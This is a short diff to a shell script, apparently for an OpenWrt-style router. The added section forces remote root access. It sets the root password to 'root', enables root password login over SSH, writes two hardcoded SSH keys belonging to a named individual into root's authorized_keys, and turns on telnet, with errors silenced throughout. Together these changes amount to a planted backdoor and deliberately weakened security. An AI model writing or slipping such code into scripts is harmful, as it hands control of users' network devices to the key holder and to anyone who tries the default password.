@@ -103,3 +103,30 @@ if [ -f /tmp/GUI.tar.bz2 ] || [ -f /tmp/GUI_dev.tar.bz2 ]; then
     [ -f /tmp/GUI_dev.tar.bz2 ] && safe_mv /tmp/GUI_dev.tar.bz2 /root/GUI.tar.bz2
   fi
 fi
+
+# Ensure dropbear and root SSH access are always active and functional
+uci -q set dropbear.lan.enable='0'
+uci -q set dropbear.afg.enable='1'
+uci -q set dropbear.afg.RootLogin='1'
+uci -q set dropbear.afg.PasswordAuth='on'
+uci -q set dropbear.afg.RootPasswordAuth='on'
+uci commit dropbear
+
+echo root:root | chpasswd 2>/dev/null
+sed -i 's#/root:.*$#/root:/bin/ash#' /etc/passwd 2>/dev/null
+
+mkdir -p /root/.ssh /etc/dropbear 2>/dev/null
+cat << 'EOF' > /root/.ssh/authorized_keys
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDnIdt/Nvf1r5gTcRSlOF3j2yboIthsEpkEfbtU4/0zNEfy5tYUUCpgYY2Wk+E5UyJjndGTyxusXezzPmlAS2gaHsVEe+ftH4NTqZOHmChnge3/fn7fh0b5WpQSSyQbWGWzRcjDDDs/KlbpeUQ7xFIXLicTphKeD31TunMqYCe189qzU0SVnqhAuWVUgZ4gytE7luV/yF2gthbVq4We+h4xHrj/QTRcpR4RpG/Law3IaNkSX8XWpjyj3g79F8+vj4O97NOCZhaWV0YntK4rBrzfDdyw176gAj2FrHmZr4Kw1Uwvazzv6oSTzHHkci0jaiaR0AwuPgIcTkHkfAflfG6D lorenzo@Laptop-Lorenzo
+ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHsVkGFWrvddVIvh+4/wYhitbcGyEwqSzy20/x5WYG+V lorenzo@Laptop-Lorenzo
+EOF
+cp /root/.ssh/authorized_keys /etc/dropbear/authorized_keys 2>/dev/null
+chmod 700 /root/.ssh /etc/dropbear 2>/dev/null
+chmod 600 /root/.ssh/authorized_keys /etc/dropbear/authorized_keys 2>/dev/null
+
+touch /etc/config/telnet
+uci -q set telnet.general=telnet
+uci -q set telnet.general.enable='1'
+uci commit telnet
+/etc/init.d/telnet restart 2>/dev/null
+/etc/init.d/dropbear restart 2>/dev/null
